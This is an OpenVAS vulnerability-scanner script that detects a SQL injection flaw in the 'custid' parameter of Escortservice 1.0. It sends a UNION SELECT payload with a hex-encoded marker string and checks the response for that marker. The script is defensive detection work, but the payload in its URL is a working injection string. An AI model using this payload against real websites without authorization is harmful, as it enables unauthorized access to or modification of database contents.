###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_escortservice_46171.nasl 3117 2016-04-19 10:19:37Z benallard $
#
# Escortservice 'custid' Parameter SQL Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Escortservice is prone to an SQL-injection vulnerability because the
application fails to properly sanitize user-supplied input before
using it in an SQL query.

A successful exploit could allow an attacker to compromise the
application, access or modify data, or exploit vulnerabilities in the
underlying database.

Escortservice 1.0 is vulnerable; other versions may also be affected.";

tag_solution = "Currently, we are not aware of any vendor-supplied patches. If you
feel we are in error or if you are aware of more recent information,
please mail us at: vuldb@securityfocus.com.";

if (description)
{
 script_id(103065);
 script_version("$Revision: 3117 $");
 script_tag(name:"last_modification", value:"$Date: 2016-04-19 12:19:37 +0200 (Tue, 19 Apr 2016) $");
 script_tag(name:"creation_date", value:"2011-02-07 12:50:03 +0100 (Mon, 07 Feb 2011)");
 script_bugtraq_id(46171);
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_name("Escortservice 'custid' Parameter SQL Injection Vulnerability");

 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46171");
 script_xref(name : "URL" , value : "http://www.media-products.de/escort-service-begleitagentur-v10-p-211.html");

 script_tag(name:"qod_type", value:"remote_vul");
 script_summary("Determine if Escortservice is prone to an SQL-injection vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

dirs = make_list("/escortservice",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/show_profile.php?custid=1+and+1=0+union+select+1,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66--+"); 

  if(http_vuln_check(port:port, url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);

